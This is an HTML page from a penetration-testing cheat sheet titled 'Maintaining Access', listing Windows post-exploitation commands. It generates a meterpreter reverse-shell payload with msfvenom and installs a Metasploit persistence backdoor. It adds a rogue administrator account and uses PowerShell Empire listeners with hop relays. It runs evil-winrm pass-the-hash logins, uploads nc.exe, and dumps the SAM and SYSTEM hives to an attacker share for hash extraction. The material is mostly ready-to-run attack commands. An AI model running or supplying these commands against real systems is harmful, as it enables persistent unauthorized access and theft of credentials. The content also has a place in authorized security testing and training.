<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Maintaining Access - Pentest Cheat Sheet</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Notes on pen-testing.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../index.html">Pentest Cheat Sheet</a></li><li class="chapter-item expanded "><a href="../scan.html"><strong aria-hidden="true">1.</strong> Scanning &amp; Enumeration</a></li><li class="chapter-item expanded "><a href="../recon.html"><strong aria-hidden="true">2.</strong> Information Gathering (Reconnaissance)</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../linux/enum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../linux/rev-shell.html"><strong aria-hidden="true">3.2.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../linux/privesc.html"><strong aria-hidden="true">3.3.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="../linux/overflow.html"><strong aria-hidden="true">3.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="../linux/checklist.html"><strong aria-hidden="true">3.5.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../windows/enum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../windows/file-upload.html"><strong aria-hidden="true">4.2.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="../windows/overflow.html"><strong aria-hidden="true">4.3.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="../windows/active.html"><strong aria-hidden="true">4.4.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../windows/privesc.html"><strong aria-hidden="true">4.5.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="../windows/rev-shell.html"><strong aria-hidden="true">4.6.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../windows/ntlm.html"><strong aria-hidden="true">4.7.</strong> NTLM Hashes</a></li><li class="chapter-item expanded "><a href="../windows/persistence.html" class="active"><strong aria-hidden="true">4.8.</strong> Maintaining Access</a></li><li class="chapter-item expanded "><a href="../windows/checklist.html"><strong aria-hidden="true">4.9.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><a href="../portfwd.html"><strong aria-hidden="true">5.</strong> Port Forwarding/Tunneling</a></li><li class="chapter-item expanded "><a href="../brute-force.html"><strong aria-hidden="true">6.</strong> Brute-Force</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Web Applications</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../web/enum.html"><strong aria-hidden="true">7.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="../web/sql.html"><strong aria-hidden="true">7.2.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="../web/file-upload.html"><strong aria-hidden="true">7.3.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="../web/fuzz.html"><strong aria-hidden="true">7.4.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../web/lfi.html"><strong aria-hidden="true">7.5.</strong> LFI</a></li><li class="chapter-item expanded "><a href="../web/xss.html"><strong aria-hidden="true">7.6.</strong> XSS</a></li></ol></li><li class="chapter-item expanded "><a href="../osint.html"><strong aria-hidden="true">8.</strong> OSINT</a></li><li class="chapter-item expanded "><a href="../passback.html"><strong aria-hidden="true">9.</strong> PassBack Attack</a></li><li class="chapter-item expanded "><a href="../steganography.html"><strong aria-hidden="true">10.</strong> Steganography</a></li><li class="chapter-item expanded "><a href="../msfvenom.html"><strong aria-hidden="true">11.</strong> MSF-Venom</a></li><li class="chapter-item expanded "><a href="../wireless.html"><strong aria-hidden="true">12.</strong> Wireless Penetration Testing</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Pentest Cheat Sheet</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="maintaining-access"><a class="header" href="#maintaining-access">Maintaining Access</a></h1>
<h3 id="generating-a-payload-w-msfvenom"><a class="header" href="#generating-a-payload-w-msfvenom">Generating a Payload w/ msfvenom</a></h3>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

use exploit/multi/handler

Background the meterpreter shell
</code></pre>
<h3 id="run-the-persistence-module"><a class="header" href="#run-the-persistence-module">Run the Persistence Module</a></h3>
<pre><code>use exploit/windows/local/persistence

set session 1
</code></pre>
<p>If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit <code>multi handler</code> and setting the payload to <code>windows/meterpreter/reverse_tcp</code> allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.</p>
<h2 id="add-a-user"><a class="header" href="#add-a-user">Add a user</a></h2>
<pre><code>net user hacker password123 /add
</code></pre>
<p>Next we add our newly created account in the &quot;Administrators&quot; and &quot;Remote Management Users&quot; groups:</p>
<pre><code>net localgroup Administrators USERNAME /add
net localgroup &quot;Remote Management Users&quot; USERNAME /add
</code></pre>
<h2 id="rdp"><a class="header" href="#rdp">RDP</a></h2>
<pre><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD
</code></pre>
<p>These switches are particularly useful:</p>
<ul>
<li>/dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process</li>
<li>/size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution</li>
<li>+clipboard -- enables clipboard support</li>
<li>/drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: <code>/drive:.,share</code>, with the period (.) referring to the current directory</li>
</ul>
<p>When creating a shared drive, this can be accessed either from the command line as <code>\\tsclient\</code>, or through File Explorer under &quot;This PC&quot;:</p>
<pre><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
</code></pre>
<h2 id="empire"><a class="header" href="#empire">Empire</a></h2>
<pre><code class="language-bash">sudo apt install powershell-empire starkiller

sudo powershell-empire server

powershell-empire client

starkiller (emprieadmin:password123)
</code></pre>
<h3 id="client"><a class="header" href="#client">Client</a></h3>
<pre><code>uselistener http
set Name CLIHTTP
set Host IP
set Port 8000
execute
back or main
</code></pre>
<p>List and kill listeners</p>
<pre><code>listeners

kill LISTENER_NAME
</code></pre>
<p>Create stager multi/bash</p>
<h3 id="empire-hop-listeners"><a class="header" href="#empire-hop-listeners">Empire Hop Listeners</a></h3>
<pre><code>uselistener http_hop
</code></pre>
<p>Specifically we need:</p>
<ul>
<li>A RedirectListener -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!</li>
<li>A Host -- the IP of the compromised webserver (.200).</li>
<li>A Port -- this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!</li>
</ul>
<h3 id="empire-modules"><a class="header" href="#empire-modules">Empire Modules</a></h3>
<pre><code class="language-bash">usemodule powershell/privesc/sherlock
</code></pre>
<h2 id="evil-winrm"><a class="header" href="#evil-winrm">Evil-winrm</a></h2>
<p>Share folder in memory</p>
<pre><code class="language-bash">evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.198.150 -s ./tools/Pivoting/Windows/
</code></pre>
<p>Upload file</p>
<pre><code>upload /usr/share/windows-binaries/nc.exe c:\windows\temp\nc.exe
</code></pre>
<h2 id="exfiltration-techniques--post-exploitation"><a class="header" href="#exfiltration-techniques--post-exploitation">Exfiltration Techniques &amp; Post Exploitation</a></h2>
<p>Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the HKEY_LOCAL_MACHINE\SAM hive. This can also be found as a file at C:\Windows\System32\Config\SAM, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:</p>
<pre><code>reg.exe save HKLM\SAM sam.bak
</code></pre>
<p>This saves the hive as a file called &quot;sam.bak&quot; in the current directory.</p>
<p>Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:</p>
<pre><code>reg.exe save HKLM\SYSTEM system.bak
</code></pre>
<p>Transfer the files over SMB for example</p>
<p>reg.exe save HKLM\SAM \ATTACKING_IP\share\sam.bak</p>
<p>Retrieve the hashes</p>
<pre><code>python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../windows/ntlm.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../windows/checklist.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../windows/ntlm.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../windows/checklist.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
